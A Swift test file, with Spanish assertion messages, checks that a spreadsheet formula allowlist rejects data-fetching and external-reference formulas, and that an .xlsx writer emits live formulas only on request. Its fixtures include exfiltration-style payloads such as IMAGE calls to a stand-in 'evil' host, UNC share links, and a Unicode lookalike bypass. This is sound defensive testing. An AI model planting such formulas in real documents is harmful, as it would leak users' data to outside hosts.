@testable import CompanionCore
import Foundation
import Testing

// Wave 20c D4 / F4b (M4): formulas are an allowlist of pure functions. A
// denylist let IMAGE (exfiltrates by URL), STOCKHISTORY, COPILOT and external
// references through; the .xlsx writer made any "=" cell a live formula.

@Test func formulaAllowlistTests() {
    testFetchingAndExternalFormulasAreRejected()
    testPlainFormulasAreAccepted()
    testInnocentTextStillPasses()
    testXLSXWritesFormulasOnlyWhenRequestedAndAllowed()
    testTheDocumentSpecCarriesTheFormulaRequest()
}

private func parse(_ cell: String) -> Result<[[SheetCell]], SheetError> {
    SheetValues.parse(any: [[cell]], for: SheetRange(a1: "A1")!)
}

func testFetchingAndExternalFormulasAreRejected() {
    let hostile = [
        #"=IMAGE("http://evil/x")"#,
        "='/ruta/[otro.xlsx]'!A1",
        #"=SUM(A1:A2)+STOCKHISTORY("MSFT","1/1/2026")"#,
        #"=COPILOT("resume A1")"#,
        #"=\\host\share\libro.xlsx"#,
        #"=SUM(A1)&"\\host\share""#,
        "=[1]Hoja1!A1",
        "=Hoja2!A1",
        #"=INDIRECT("A1")"#,
        "=SUM(Tabla1[Col])",
        "=SecretoDefinido",
        #"=IF(A1>1,"x"#,
        "+IMAGE(\"http://evil/x\")",
        "@STOCKHISTORY(\"MSFT\")",
        "=\u{FF29}MAGE(\"http://evil/x\")",
    ]
    for formula in hostile {
        guard case .failure(let error) = parse(formula) else {
            return expect(false, "allowlist: aceptada \(formula)")
        }
        expectEq(error, .forbiddenFormula, "allowlist: rechazada \(formula)")
    }
}

func testPlainFormulasAreAccepted() {
    for formula in ["=SUM(A1:A2)", #"=IF(A1>2,"si","no")"#, "=VLOOKUP(A1,B1:C9,2,FALSE)", "=$A$1+B$2*1.5E3",
                    "=SUM(A:A)", "=ROUND(A1/3,2)", "=-A1", "=A1&\" \"&B1", "=IFERROR(A1/B1,0)"] {
        guard case .success(let cells) = parse(formula) else { return expect(false, "allowlist: rechazada \(formula)") }
        expectEq(cells[0][0], .formula(formula), "allowlist: pasa \(formula)")
    }
}

func testInnocentTextStillPasses() {
    for fine in ["-12 grados", "+52 55 1234", "@karen", "hola", #"\\host\share"#] {
        guard case .success = parse(fine) else { return expect(false, "texto inocente rechazado: \(fine)") }
    }
}

func testXLSXWritesFormulasOnlyWhenRequestedAndAllowed() {
    let sheet = XLSXWriter.Sheet(name: "x", rows: [["a"], ["=SUM(A1:A2)"]])
    let unrequested = XLSXWriter.sheetXML(sheet)
    expect(!unrequested.contains("<f>"), "xlsx: sin pedirla, una celda = es texto")
    expect(unrequested.contains("t=\"inlineStr\"><is><t>=SUM(A1:A2)</t>"), "xlsx: queda literal en línea")
    expect(XLSXWriter.sheetXML(sheet, allowFormulas: true).contains("<f>SUM(A1:A2)</f>"),
           "xlsx: pedida y permitida, va como fórmula")
    let hostile = XLSXWriter.Sheet(name: "x", rows: [["a"], [#"=IMAGE("http://evil/x")"#], ["='/r/[o.xlsx]'!A1"],
                                                     [#"=SUM(A1)+STOCKHISTORY("M")"#]])
    let xml = XLSXWriter.sheetXML(hostile, allowFormulas: true)
    expect(!xml.contains("<f>"), "xlsx: pedida pero fuera de la allowlist, sigue siendo texto")
    expect(xml.contains("IMAGE"), "xlsx: y queda visible")
}

func testTheDocumentSpecCarriesTheFormulaRequest() {
    let json = #"{"title":"t","blocks":[{"type":"table","columns":["a"],"rows":[["=1+1"]]}]"#
    expectEq(DocumentSpec.parse(json + "}")?.allowFormulas, false, "spec: por defecto no hay fórmulas vivas")
    expectEq(DocumentSpec.parse(json + #","formulas":true}"#)?.allowFormulas, true, "spec: formulas:true las pide")
    let live = DocumentSpec.parse(json + #","formulas":true}"#).flatMap(XLSXWriter.package)
    expect(live != nil, "spec: el paquete se arma")
}
